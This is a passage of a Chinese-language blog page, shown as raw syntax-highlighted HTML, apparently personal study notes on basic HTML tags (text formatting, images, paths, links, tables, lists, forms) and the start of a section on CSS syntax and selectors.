class="hljs-name">p</span>&gt;</span><br></code></pre></td></tr></table></figure><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>全部素材、源码、ppt、素材、讲义都在置顶留言,去下载吧~~<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>也可以直接： https://gitee.com/xiaoqiang001/html_css_material.git 下载哈！<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>1. web端布局：先讲解HTML5常用标签，接着讲解CSS3常见样式增加的H5C3新特性，新语法，最后讲解<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span><br></code></pre></td></tr></table></figure><p>如此，就能分段。<br><strong>换行标签</strong><br><strong>换行是单标签</strong></p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-section">&lt;br /&gt;</span><br></code></pre></td></tr></table></figure><p>br加空格，反斜杠。<br>强制文字换行。</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">br</span> /&gt;</span>和<span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span>的不同之处在于，段落间有空行，而换行是紧接着下一行开头开始的。<br></code></pre></td></tr></table></figure><h4 id="文本格式化标签"><a href="#文本格式化标签" class="headerlink" title="文本格式化标签"></a>文本格式化标签</h4><p>如<strong>粗体</strong>、<em>斜体</em>、下划线等等</p><p>加粗：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">strong</span>&gt;</span>我是加粗的文字<span class="hljs-tag">&lt;/<span class="hljs-name">strong</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">b</span>&gt;</span>我是加粗的文字<span class="hljs-tag">&lt;/<span class="hljs-name">b</span>&gt;</span><br></code></pre></td></tr></table></figure><p>斜体：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">em</span>&gt;</span>我是倾斜的文字<span class="hljs-tag">&lt;/<span class="hljs-name">em</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">i</span>&gt;</span>倾斜<span class="hljs-tag">&lt;/<span class="hljs-name">i</span>&gt;</span><br></code></pre></td></tr></table></figure><p>删除线：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs (html)">&lt;del&gt;我是删除线&lt;/del&gt;<br>&lt;s&gt;&lt;/s&gt;<br></code></pre></td></tr></table></figure><p>下划线：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">ins</span>&gt;</span>我是下划线<span class="hljs-tag">&lt;/<span class="hljs-name">ins</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">u</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">u</span>&gt;</span><br></code></pre></td></tr></table></figure><h4 id="div和span标签"><a href="#div和span标签" class="headerlink" title="div和span标签"></a>div和span标签</h4><p>这两个标签是无语义的，是放内容的盒子<br>div是division的缩写，表示分割，分区。</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs css">&lt;<span class="hljs-selector-tag">div</span>&gt;我是一个<span class="hljs-selector-tag">div</span>标签，我单独占一行&lt;/<span class="hljs-selector-tag">div</span>&gt;<br>&lt;<span class="hljs-selector-tag">div</span>&gt;我是一个<span class="hljs-selector-tag">div</span>标签，我单独占一行&lt;/<span class="hljs-selector-tag">div</span>&gt;<br>&lt;<span class="hljs-selector-tag">span</span>&gt;百度&lt;/<span class="hljs-selector-tag">span</span>&gt;<br>&lt;<span class="hljs-selector-tag">span</span>&gt;搜狐&lt;/<span class="hljs-selector-tag">span</span>&gt;<br>&lt;<span class="hljs-selector-tag">span</span>&gt;新浪&lt;/<span class="hljs-selector-tag">span</span>&gt;<br></code></pre></td></tr></table></figure><p>结果为</p><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs applescript">我是一个<span class="hljs-keyword">div</span>标签，我单独占一行<br>我是一个<span class="hljs-keyword">div</span>标签，我单独占一行<br>百度 搜狐 新浪<br></code></pre></td></tr></table></figure><p>此两个标签一横一竖，用于布局</p><h4 id="图像标签和路径（重点）"><a href="#图像标签和路径（重点）" class="headerlink" title="图像标签和路径（重点）"></a>图像标签和路径（重点）</h4><p>1.图像标签</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">&lt;img <span class="hljs-attribute">src</span>=<span class="hljs-string">&quot;图像URL&quot;</span>/&gt;<br></code></pre></td></tr></table></figure><p>src 是img标签的必须属性，它用于指定图像文件的路径和文件名。<br>img是单标签。</p><figure class="highlight maxima"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs maxima">可选参数<br>alt: 当图片显示不出来时，替换用<br><span class="hljs-built_in">title</span>：鼠标浮在图片上时，显示文字<br><span class="hljs-built_in">width</span>：修改图像的宽度<br><span class="hljs-built_in">height</span>：修改图像的高度<br><span class="hljs-built_in">border</span>：设置图像的边框粗细<br></code></pre></td></tr></table></figure><h4 id="路径"><a href="#路径" class="headerlink" title="路径"></a>路径</h4><p>1.相对路径</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs stylus">相对路径：<br>以**引用文件所在位置**为参考基础，而建立出的目录路径。<br>简单来说，图片相对于HTML页面的位置。<br>同一级引用：此html文件与引用图片位于同一层<br>&lt;<span class="hljs-selector-tag">img</span> <span class="hljs-attribute">src</span> = <span class="hljs-string">&quot;img.jpg&quot;</span> /&gt;<br>下一级引用：<br>&lt;<span class="hljs-selector-tag">img</span> <span class="hljs-attribute">src</span> = <span class="hljs-string">&quot;images/img.jpg&quot;</span> /&gt;<br>上一级引用:<br>&lt;<span class="hljs-selector-tag">img</span> <span class="hljs-attribute">src</span> = <span class="hljs-string">&quot;../img.jpg&quot;</span> /&gt;<br></code></pre></td></tr></table></figure><p>2.绝对路径</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">&lt;<span class="hljs-selector-tag">img</span> <span class="hljs-attribute">src</span> = <span class="hljs-string">&quot;img的url&quot;</span>/&gt;<br></code></pre></td></tr></table></figure><h4 id="超链接标签"><a href="#超链接标签" class="headerlink" title="超链接标签"></a>超链接标签</h4><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs xml">语法:<br><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span> = <span class="hljs-string">&quot;跳转目标&quot;</span> <span class="hljs-attr">target</span> = <span class="hljs-string">&quot;窗口弹出方式&quot;</span>&gt;</span>文本或图片<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><br>外部链接跳转目标格式：<br>http://www.kawatsuki.com<br>需要写http与www.<br>内部链接：<br><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span> = <span class="hljs-string">&quot;gons.html&quot;</span>&gt;</span>gons<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><br>即可<br>空链接：<br><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span> = <span class="hljs-string">&quot;#&quot;</span>&gt;</span>空连接<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><br>显示为链接，但是不指向任何地方<br>下载链接：<br><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span> = <span class="hljs-string">&quot;tar.zip&quot;</span>&gt;</span>下载文件<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><br>点击链接就会下载<br>锚点链接：快速跳转到本页面某处<br>语法：<br><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span> = <span class="hljs-string">&quot;#f&quot;</span>&gt;</span>个人简介<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><br>去往某处标题：<br><span class="hljs-tag">&lt;<span class="hljs-name">h4</span> <span class="hljs-attr">id</span> = <span class="hljs-string">&quot;f&quot;</span>&gt;</span>个人简介<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><br></code></pre></td></tr></table></figure><h4 id="注释"><a href="#注释" class="headerlink" title="注释"></a>注释</h4><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs xml">语法<br><span class="hljs-comment">&lt;!-- ..... --&gt;</span><br>如<br><span class="hljs-comment">&lt;!--这是注释--&gt;</span><br>或快捷键：<br>ctrl + /<br>可快速注释<br></code></pre></td></tr></table></figure><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs 1c">特殊字符<br>空格：<br><span class="hljs-meta">&amp;nbsp;</span><br>是一个空格<br><span class="hljs-meta">&amp;lt;</span><br><span class="hljs-meta">&amp;gt;</span><br>分别是小于号（less than）和大于号。<br>以<span class="hljs-meta">&amp;开头以;结尾</span><br></code></pre></td></tr></table></figure><h3 id="表格"><a href="#表格" class="headerlink" title="表格"></a>表格</h3><h4 id="表格的基本语法"><a href="#表格的基本语法" class="headerlink" title="表格的基本语法"></a>表格的基本语法</h4><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs css">&lt;<span class="hljs-selector-tag">table</span>&gt;<br>    &lt;<span class="hljs-selector-tag">tr</span>&gt;<br>        &lt;<span class="hljs-selector-tag">td</span>&gt;单元格中的文字&lt;/<span class="hljs-selector-tag">td</span>&gt;<br>        ...<br>    &lt;/<span class="hljs-selector-tag">tr</span>&gt;<br>    ...<br>&lt;/<span class="hljs-selector-tag">table</span>&gt;<br><br><span class="hljs-selector-tag">table</span>是用于定义表格的标签<br><span class="hljs-selector-tag">tr</span>是表格中的行<br><span class="hljs-selector-tag">td</span>是<span class="hljs-selector-tag">table</span> data，定义表格中的单元格，必须嵌套在<span class="hljs-selector-tag">tr</span>内<br></code></pre></td></tr></table></figure><h4 id="表头单元格标签"><a href="#表头单元格标签" class="headerlink" title="表头单元格标签"></a>表头单元格标签</h4><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs xml">用<span class="hljs-tag">&lt;<span class="hljs-name">th</span>&gt;</span>words<span class="hljs-tag">&lt;/<span class="hljs-name">th</span>&gt;</span><br>代替<span class="hljs-tag">&lt;<span class="hljs-name">td</span>&gt;</span><br></code></pre></td></tr></table></figure><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs css">&lt;<span class="hljs-selector-tag">thead</span>&gt;<br>&lt;/<span class="hljs-selector-tag">thead</span>&gt;<br>可以用此包括第一个&lt;<span class="hljs-selector-tag">tr</span>&gt;&lt;/<span class="hljs-selector-tag">tr</span>&gt;<br>表示表头区域<br>&lt;<span class="hljs-selector-tag">tbody</span>&gt;<br>&lt;<span class="hljs-selector-tag">tr</span>&gt;<br>...<br>&lt;/<span class="hljs-selector-tag">tr</span>&gt;<br>&lt;<span class="hljs-selector-tag">tr</span>&gt;<br>...<br>&lt;/<span class="hljs-selector-tag">tr</span>&gt;<br>&lt;/<span class="hljs-selector-tag">tbody</span>&gt;<br><span class="hljs-selector-tag">thead</span>与<span class="hljs-selector-tag">tbody</span>内必须有&lt;<span class="hljs-selector-tag">tr</span>&gt;<br>此两个标签用于分割表头与表体，包含于&lt;<span class="hljs-selector-tag">table</span>&gt;内<br></code></pre></td></tr></table></figure><h4 id="合并单元格"><a href="#合并单元格" class="headerlink" title="合并单元格"></a>合并单元格</h4><p>合并单元格的方式：<br>跨行：rowspan = “合并单元格个数”<br>跨列：colspan = “合并单元格个数”<br>目标单元格：<br>跨行：写于最上侧单元格内。<br>跨列：在左侧单元格内。</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs xml">三部曲：<br>1.确定跨行还是跨列<br>2.找到目标单元格 <span class="hljs-tag">&lt;<span class="hljs-name">td</span> <span class="hljs-attr">colspan</span> = <span class="hljs-string">&quot;10&quot;</span>&gt;</span>woreds<span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span><br>3.删除多余格<br></code></pre></td></tr></table></figure><h3 id="列表"><a href="#列表" class="headerlink" title="列表"></a>列表</h3><p>1.无序列表</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs css">语法：<br>&lt;<span class="hljs-selector-tag">ul</span>&gt;<br>    &lt;<span class="hljs-selector-tag">li</span>&gt;<br>    ....<br>    &lt;/<span class="hljs-selector-tag">li</span>&gt;<br>&lt;/<span class="hljs-selector-tag">ul</span>&gt;<br>注意：<br><span class="hljs-selector-tag">ul</span>中，只能放<span class="hljs-selector-tag">li</span>标签<br><span class="hljs-selector-tag">li</span>中，可以放任何标签<br></code></pre></td></tr></table></figure><p>2.有序列表</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">ol</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">li</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">ol</span>&gt;</span><br>有序列表会自动加上1，2，3的样式，即有序。<br></code></pre></td></tr></table></figure><p>3.自定义列表</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs xml">使用场景：<br>关注我们<br><br>新浪微博<br>官方微信<br>联系我们<br><br><br>这样的列表<br><span class="hljs-tag">&lt;<span class="hljs-name">dl</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">dt</span>&gt;</span>名词1<span class="hljs-tag">&lt;/<span class="hljs-name">dt</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">dd</span>&gt;</span>名词1解释1<span class="hljs-tag">&lt;/<span class="hljs-name">dd</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">dd</span>&gt;</span>名词1解释2<span class="hljs-tag">&lt;/<span class="hljs-name">dd</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dl</span>&gt;</span><br></code></pre></td></tr></table></figure><h3 id="表单"><a href="#表单" class="headerlink" title="表单"></a>表单</h3><p>如填写注册信息<br>用于收集用户信息。<br>表单的组成：</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs">1.表单域<br>2.表单元素<br>3.提示信息<br><br></code></pre></td></tr></table></figure><h4 id="表单域"><a href="#表单域" class="headerlink" title="表单域"></a>表单域</h4><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs xml">表单域是一个包含表单元素的区域<br><span class="hljs-tag">&lt;<span class="hljs-name">form</span>&gt;</span>标签用于定义表单域<br><span class="hljs-tag">&lt;<span class="hljs-name">form</span>&gt;</span>会把它范围内的表单元素信息提交给服务器<br><span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">action</span> = <span class="hljs-string">&quot;url地址&quot;</span> <span class="hljs-attr">method</span> = <span class="hljs-string">&quot;提交方式&quot;</span> <span class="hljs-attr">name</span> = <span class="hljs-string">&quot;表单域名称&quot;</span>&gt;</span><br>....<br><span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span><br></code></pre></td></tr></table></figure><h4 id="表单控件"><a href="#表单控件" class="headerlink" title="表单控件"></a>表单控件</h4><p>1.input输入表单元素<br>2.select下拉表单元素<br>3.textarea文本域元素</p><p>input:</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">&lt;<span class="hljs-keyword">input</span>&gt;是单标签，用于收集用户信息。<br>&lt;<span class="hljs-keyword">input</span> <span class="hljs-keyword">type</span> = &quot;属性值&quot;/&gt;<br>属性值有<br><span class="hljs-type">text</span>（文本）<br><br><br>&lt;form&gt;<br>    用户名：&lt;<span class="hljs-keyword">input</span> <span class="hljs-keyword">type</span> = &quot;text&quot;/&gt;<br>&lt;/form&gt;<br><br><span class="hljs-keyword">password</span>（密码）<br>输入的是星号，不会泄露<br><br><br>radio（单选）<br>性别：男&lt;<span class="hljs-keyword">input</span> <span class="hljs-keyword">type</span> = &quot;radio&quot;/&gt; 女&lt;<span class="hljs-keyword">input</span> <span class="hljs-keyword">type</span> = &quot;radio&quot;/&gt;<br><span class="hljs-keyword">input</span>内必须有<span class="hljs-type">name</span>元素，且相同，才能达到单选的目的<br><br><br>checkbox（多选）<br>爱好：吃饭&lt;<span class="hljs-keyword">input</span> <span class="hljs-keyword">type</span> = &quot;checkbox&quot;/&gt;  睡觉&lt;<span class="hljs-keyword">input</span> <span class="hljs-keyword">type</span> = &quot;checkbox/&gt;&quot; 打豆豆&lt;<span class="hljs-keyword">input</span> <span class="hljs-keyword">type</span> = &quot;checkbox/&gt;&quot;<br><br><br></code></pre></td></tr></table></figure><p>name属性：分别不同表单元素<br>value属性：给此元素一个默认值，如“请输入用户名”。单选框也应写value，用于向后台传递信息。即规定input元素值。<br><strong>以上两个元素，每个input都应该有！</strong><br><br><br>checked属性：当页面打开的时候，会默认选中该按钮（单选或复选）</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs abnf">&lt;input type <span class="hljs-operator">=</span> <span class="hljs-string">&quot;checkbox&quot;</span> checked <span class="hljs-operator">=</span> <span class="hljs-string">&quot;checked&quot;</span>/&gt;<br></code></pre></td></tr></table></figure><p>maxlength：规定输入最大长度</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs abnf">&lt;input type <span class="hljs-operator">=</span> <span class="hljs-string">&quot;checkbox&quot;</span> checked <span class="hljs-operator">=</span> <span class="hljs-string">&quot;checked&quot;</span> maxlength <span class="hljs-operator">=</span> <span class="hljs-string">&quot;6&quot;</span>/&gt;<br></code></pre></td></tr></table></figure><p><br><br>提交按钮submit<br>重置按钮reset</p><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs ada">&lt;input <span class="hljs-keyword">type</span> <span class="hljs-type">= </span><span class="hljs-string">&quot;submit&quot;</span>&gt;<br>&lt;input <span class="hljs-keyword">type</span> <span class="hljs-type">= </span><span class="hljs-string">&quot;submit&quot;</span> value = <span class="hljs-string">&quot;免费注册&quot;</span>&gt;<br>可以用value值来替换“提交”<br>&lt;input <span class="hljs-keyword">type</span> <span class="hljs-type">= </span><span class="hljs-string">&quot;reset&quot;</span> value = <span class="hljs-string">&quot;重新填写&quot;</span>&gt;<br>还原为默认值<br></code></pre></td></tr></table></figure><p>普通按钮button<br>文件域file</p><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs stata">&lt;<span class="hljs-keyword">input</span> <span class="hljs-keyword">type</span> = <span class="hljs-string">&quot;button&quot;</span> value = <span class="hljs-string">&quot;获取验证码&quot;</span>&gt;<br>&lt;<span class="hljs-keyword">input</span> <span class="hljs-keyword">type</span> = <span class="hljs-string">&quot;file&quot;</span> &gt;<br><span class="hljs-keyword">file</span>加不了value。<br></code></pre></td></tr></table></figure><p>lable标签<br>lable用于绑定一个表单元素，当点击lable内的文本，浏览器会自动选择对应表单<br>语法:</p><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs stata">&lt;<span class="hljs-keyword">label</span> <span class="hljs-keyword">for</span> = <span class="hljs-string">&quot;sex&quot;</span>&gt;男&lt;/<span class="hljs-keyword">label</span>&gt;<br>&lt;<span class="hljs-keyword">input</span> <span class="hljs-keyword">type</span> = <span class="hljs-string">&quot;radio&quot;</span> name = <span class="hljs-string">&quot;sex&quot;</span> value = <span class="hljs-string">&quot;male&quot;</span> id = <span class="hljs-string">&quot;sex&quot;</span>/&gt;<br>核心：<br><span class="hljs-keyword">label</span>中的<span class="hljs-keyword">for</span>与表单元素中的id要相同。<br>不要写错<span class="hljs-keyword">label</span>！！！！<br></code></pre></td></tr></table></figure><p>select下拉表单元素</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs xml">籍贯:<br><span class="hljs-tag">&lt;<span class="hljs-name">select</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">option</span>&gt;</span>o1<span class="hljs-tag">&lt;/<span class="hljs-name">option</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">option</span> <span class="hljs-attr">selected</span> = <span class="hljs-string">&quot;selected&quot;</span>&gt;</span>o2<span class="hljs-tag">&lt;/<span class="hljs-name">option</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">select</span>&gt;</span><br>加selected会默认选中。<br></code></pre></td></tr></table></figure><p>textarea文本域表单元素：<br>如大量书写文字，个人简介120字。</p><figure class="highlight stan"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs stan">&lt;textarea <span class="hljs-built_in">rows</span> = <span class="hljs-string">&quot;3&quot;</span> <span class="hljs-built_in">cols</span> = <span class="hljs-string">&quot;20&quot;</span>&gt;<br>&lt;/textarea&gt;<br><span class="hljs-built_in">rows</span>与<span class="hljs-built_in">cols</span>基本上不使用，以后用css改<br></code></pre></td></tr></table></figure><h2 id="CSS"><a href="#CSS" class="headerlink" title="CSS"></a>CSS</h2><p>css是网页的美容师<br>html的局限性：只关注内容的语义，<strong>丑</strong></p><h4 id="css语法规范"><a href="#css语法规范" class="headerlink" title="css语法规范"></a>css语法规范</h4><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">charset</span>=<span class="hljs-string">&quot;UTF-8&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">http-equiv</span>=<span class="hljs-string">&quot;X-UA-Compatible&quot;</span> <span class="hljs-attr">content</span>=<span class="hljs-string">&quot;IE=edge&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;viewport&quot;</span> <span class="hljs-attr">content</span>=<span class="hljs-string">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>测试案例<br>    <span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">style</span>&gt;</span><span class="language-css"></span><br><span class="language-css">        <span class="hljs-selector-tag">p</span> &#123;</span><br><span class="language-css">            <span class="hljs-attribute">color</span>:red;</span><br><span class="language-css">        &#125;</span><br><span class="language-css">    </span><span class="hljs-tag">&lt;/<span class="hljs-name">style</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br>   <span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span><br>    you<br>   <span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br>于<span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span>标签内加入<span class="hljs-tag">&lt;<span class="hljs-name">style</span>&gt;</span><span class="language-css">标签，于style内，格式为</span><br><span class="language-css">目标 &#123;属性:属性值;&#125;记得分号结尾</span><br><span class="language-css"></span><br><span class="language-css"><span class="hljs-selector-tag">p</span> &#123;<span class="hljs-attribute">color</span>:red;</span><br><span class="language-css">    <span class="hljs-attribute">font-size</span> : <span class="hljs-number">12px</span>;&#125;</span><br></code></pre></td></tr></table></figure><h4 id="CSS选择器"><a href="#CSS选择器" class="headerlink" title="CSS选择器"></a>CSS选择器</h4><p>根据不同需求选出不同标签<br>基础选择器：</p><h5 id="标签选择器"><a href="#标签选择器" class="headerlink" title="标签选择器"></a>标签选择器</h5><p>以标签名作为选择器</p><h5 id="类选择器"><a href="#类选择器" class="headerlink" title="类选择器"></a>类选择器</h5><p>可单独选择一个，或某几个标签。<br>先定义类，再将元素拉入类</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span 